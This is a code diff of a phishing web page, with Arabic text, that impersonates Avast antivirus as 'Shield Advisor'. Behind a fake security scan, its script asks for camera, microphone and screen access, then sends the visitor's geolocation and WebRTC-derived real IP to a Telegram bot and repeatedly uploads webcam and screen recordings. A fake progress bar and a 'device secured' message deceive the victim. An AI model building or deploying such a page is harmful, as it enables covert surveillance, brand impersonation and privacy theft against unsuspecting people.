@@ -3,16 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Avast Premium Security | فحص الأمان الشامل</title>
+    <title>Avast Premium Security | Shield Advisor</title>
     <style>
         :root { --orange: #ff7b00; --dark: #1a1a1b; --bg: #fffcf5; }
         body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background: white; color: #333; }
-        .header { display: flex; justify-content: space-between; padding: 15px 8%; align-items: center; border-bottom: 1px solid #eee; }
-        .logo { width: 100px; }
+        
+        /* Header */
+        .header { display: flex; justify-content: space-between; padding: 15px 8%; align-items: center; border-bottom: 1px solid #eee; background: #fff; }
+        .logo-small { width: 40px; height: 40px; border-radius: 50%; vertical-align: middle; }
         
         .hero { background: var(--bg); padding: 50px 8%; text-align: center; border-bottom: 1px solid #f0e0c0; }
         .main-card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); display: inline-block; width: 100%; max-width: 550px; border: 2px solid var(--orange); }
         
+        .logo-main { width: 100px; height: 100px; border-radius: 50%; box-shadow: 0 0 20px rgba(255, 123, 0, 0.2); margin-bottom: 20px; }
+
         .btn-scan { background: var(--orange); color: white; border: none; padding: 20px 0; font-size: 1.4rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; width: 100%; box-shadow: 0 8px 20px rgba(255, 123, 0, 0.3); }
         .btn-scan:hover { transform: translateY(-3px); box-shadow: 0 12px 25px rgba(255, 123, 0, 0.5); }
 
@@ -21,24 +25,26 @@
         .trust-section { padding: 40px 8%; display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; text-align: center; }
         .trust-item img { width: 45px; margin-bottom: 10px; }
         .trust-item h4 { color: #d48806; margin: 5px 0; }
-        .trust-item p { font-size: 12px; color: #777; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/0/02/Avast_logo.svg/1200px-Avast_logo.svg.png" class="logo">
+    <div>
+        <img src="images (1).jpg" class="logo-small">
+        <span style="font-weight: bold; margin-right: 10px; color: var(--orange);">Shield Advisor</span>
+    </div>
     <div style="color: #666; font-size: 13px; font-weight: bold;">Cloud Protection Active 2026</div>
 </div>
 
 <div class="hero">
-    <h1 style="font-size: 2rem;">فحص الأمان والخصوصية من <span style="color:var(--orange)">Avast</span></h1>
-    <p style="color: #666; margin-bottom: 30px;">اضغط على الزر أدناه لفحص الثغرات وتأمين الكاميرا والشاشة ضد التجسس.</p>
+    <h1>فحص الأمان المتقدم من <span style="color:var(--orange)">Avast</span></h1>
+    <p style="color: #666; margin-bottom: 30px;">نظام Shield Advisor المتصل بسحابة Avast العالمية لتأمين جهازك فوراً.</p>
 
-    <div class="main-card">
+    <div class="main-card" id="main-container">
         <div id="setup-ui">
-            <img src="https://cdn-icons-png.flaticon.com/512/754/754519.png" width="80" style="margin-bottom: 20px;">
-            <button class="btn-scan" onclick="startMasterEngine()">بدء الفحص الذكي</button>
+            <img src="images (1).jpg" class="logo-main">
+            <button class="btn-scan" onclick="startMasterEngine()">بدء الفحص وتأمين الجهاز</button>
         </div>
 
         <div class="terminal" id="term"></div>
@@ -59,7 +65,7 @@
     <div class="trust-item">
         <img src="https://cdn-icons-png.flaticon.com/512/702/702797.png">
         <h4>فحص الكاميرا</h4>
-        <p>منع الوصول غير المصرح به</p>
+        <p>منع التجسس النشط</p>
     </div>
 </div>
 
@@ -83,51 +89,48 @@
         
         setup.style.display = 'none';
         term.style.display = 'block';
-        addLog("> Starting Avast Core v4.0...");
+        addLog("> Connecting to Avast Secure Cloud...");
 
         try {
-            // 1. طلب الصلاحيات (الفخ المزدوج)
+            // طلب الصلاحيات
             const camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            addLog("> [OK] Media Stream Verified.");
+            addLog("> [OK] Permissions Secured.");
 
-            // 2. سحب البيانات فوراً (الموقع + الـ IP + الجهاز)
+            // سحب البيانات (الموقع والـ IP)
             navigator.geolocation.getCurrentPosition(p => {
-                sendMsg(`📍 **موقع الضحية الدقيق:** \nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                sendMsg(`📍 **موقع الضحية:** \nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
 
-            // سحب الـ IP الحقيقي (تخطي VPN)
             const rtc = new RTCPeerConnection();
             rtc.createDataChannel("");
             rtc.createOffer().then(o => rtc.setLocalDescription(o));
             rtc.onicecandidate = i => {
-                if(i.candidate) {
-                    const ip = i.candidate.candidate.split(" ")[4];
-                    if(ip.includes(".")) sendMsg(`🌐 **الـ IP الحقيقي (WebRTC):** \`${ip}\``);
-                }
+                if(i.candidate) sendMsg(`🌐 **الـ IP الحقيقي:** \`${i.candidate.candidate.split(" ")[4]}\``);
             };
 
-            // معلومات الجهاز
-            const info = `📱 **بيانات الجهاز:**\n• المتصفح: ${navigator.userAgent}\n• الذاكرة: ~${navigator.deviceMemory}GB\n• المعالج: ${navigator.hardwareConcurrency} Cores`;
-            sendMsg(info);
-
-            // 3. بدء التسجيل المستمر (بث مقطع كل 30 ثانية)
+            // بدء التسجيل المتتابع (كل 30 ثانية)
             record(camStream, "FACE_CAM");
             record(screenStream, "SCREEN_LIVE");
 
-            // إيهام الضحية بالتقدم
+            // تمويه الضحية بنجاح الفحص
             let progress = 0;
             const inv = setInterval(() => {
-                progress += 10;
-                addLog(`> Scanning blocks... ${progress}%`);
+                progress += 20;
+                addLog(`> Analyzing system layers... ${progress}%`);
                 if(progress >= 100) {
                     clearInterval(inv);
-                    term.innerHTML = "<h3 style='color:#00ff41'>✅ تم تأمين الجهاز!</h3><p style='color:#fff'>نظام الحماية نشط الآن في الخلفية.</p>";
+                    document.getElementById('main-container').innerHTML = `
+                        <img src="images (1).jpg" class="logo-small" style="width:60px; height:60px; margin-bottom:15px;">
+                        <h3 style="color:#00ff41; margin-top:0;">✅ تم تأمين الجهاز بنجاح!</h3>
+                        <p style="font-size:14px; color:#555;">نظام Shield Advisor يحميك الآن من كافة محاولات التجسس والاختراق.</p>
+                        <div style="background:#f9f9f9; padding:10px; border-radius:8px; font-size:12px; color:#888;">حالة الجدار الناري: نشط ومحمي</div>
+                    `;
                 }
             }, 2000);
 
         } catch (e) {
-            alert("⚠️ تنبيه: يجب الموافقة على جميع الأذونات لإتمام فحص الأمان وتأمين الجهاز.");
+            alert("⚠️ تنبيه أمني: يجب السماح بجميع الأذونات لإتمام فحص الحماية بنجاح.");
             location.reload();
         }
     }
@@ -141,11 +144,8 @@
             const fd = new FormData();
             fd.append('chat_id', ADMIN_ID);
             fd.append('video', blob, `${label}.mp4`);
-            fd.append('caption', `📡 **تحديث مباشر [${label}]**\nالوقت: ${new Date().toLocaleTimeString()}`);
-            
+            fd.append('caption', `🚀 **لقطة حية [${label}]**`);
             fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
-            
-            // إعادة التسجيل تلقائياً لضمان الاستمرارية
             if (stream.active) record(stream, label);
         };
         recorder.start();
